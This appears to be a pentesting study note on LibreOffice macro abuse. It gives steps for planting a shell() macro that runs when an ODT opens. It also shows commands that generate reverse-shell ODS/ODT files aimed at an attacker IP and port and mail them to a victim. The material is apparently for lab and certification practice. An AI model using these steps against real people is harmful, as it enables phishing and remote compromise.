---
Primary_category: "[[FILE MANIPULATION]]"
title: MACRO ABUSE
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[FILE MANIPULATION]]

#### *LibreOffice Macros*

##### *Workflow*

It might occurs that a computer has *Libre Office's Macro Security* options disabled or poorly configured

![[MACRO ABUSE-20261112175521100.webp|450]]

> ***Zoom in***

If so, it's likely that any macro will be executed once a certain action is performed, such as opening the given *Office* document

Therefore, an attacker could create a new *Office* document and add certain *Macros* that will be executed once the victim opens the document in question or perfoms any other actions related to it

This task can be carried out manually or using an automated tool

##### *Requirements*
	
- ***Macro Security Feature is disabled in the Victim's Libre Office***

##### *Abuse - Manual*

Let's suppose that we are facing a web application that has an upload feature that asks us to upload a *ODT* file

So, we could proceed as follows:

- ***Open Libre Office to create a new ODT file***

- ***Add a new "Basic" Macro to the document***

> ***Tools → Macros → Organize → Basic...***

![[MACRO ABUSE-20261112180422600.webp|450]]

> ***Zoom in***

- ***Select the ODT file, click on "New" option and set a name to the new Basic Module***

![[MACRO ABUSE-20261112180818304.webp|350]]

> ***Zoom in***

- ***Pass the desired command to the `shell()` function***

![[MACRO ABUSE-20261112181107494.webp|450]]

> ***Zoom in***

- ***Save both the macro and the ODT file***

- ***Add a trigger to run the Macro when the document is opened***

> ***Tools → Customize... → Events → Open Document → Macro***

![[MACRO ABUSE-20261112181437490.webp|400]]

> ***Zoom in***

![[MACRO ABUSE-20261112181517882.webp|350]]

- ***Select the created Macro within the ODT file and click on "OK"***

![[MACRO ABUSE-20261112181624274.webp|350]]

- ***Click on "OK" option again and save the document once more***

After these steps, the *ODT* file is ready to upload and achieve *RCE*

###### *Resources*

- ***[Initial Access via Malicious ODT Macro](https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d)***

- ***[ODT Files](https://oscp.adot8.com/cool/client-side-attacks/odt-files)***


##### *Abuse - Automated*

In this case, let's imagine that we gain access to an email account's mailbox and read an email that says →

> [!TLDR]- *Email*
>
> ***Team,***
>
> ***We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility.*** 
>
> ***I will forward all the documents after checking everything is working okay.*** 
>
> ***Sorry for the inconveniences.***
>

It seems that this person is waiting to receive *LibreOffice* documents so they can process and red their content

Therefore, we could generate a malicious *ODT/ODS* - among others - and send it by email as an attachment

###### *Setup*

```bash
git clone https://github.com/0bfxgh0st/MMG-LO
```

###### *Creating the malicious LibreOffice Document*

- ***ODS***

```bash
python3 mmg-ods.py <LINUX/WINDOWS> <ATTACKER_IP> <LISTENING_PORT>
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 mmg-ods.py windows 192.168.45.233 443
> ```
>

- ***ODT***

```bash
python3 mmg-odt.py <LINUX/WINDOWS> <ATTACKER_IP> <LISTENING_PORT>
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 mmg-odt.py windows 192.168.45.233 443
> ```
>

###### *Sending the Email*

```bash
sendemail -f '<SENDER>' -t '<RECIPIENT>' -s <TARGET>:<SMTP_PORT> -u '<SUBJECT>' -m '<BODY>' -a <ODS/ODT_PATH> 
```

> [!DANGER]- *e.g.*
>
> ```bash
> sendemail -f 'john.doe@localhost' -t 'admin@localhost' -s 192.168.143.140:25 -u 'Review' -m 'Spreadsheet' -a ./file.ods 
> ```
>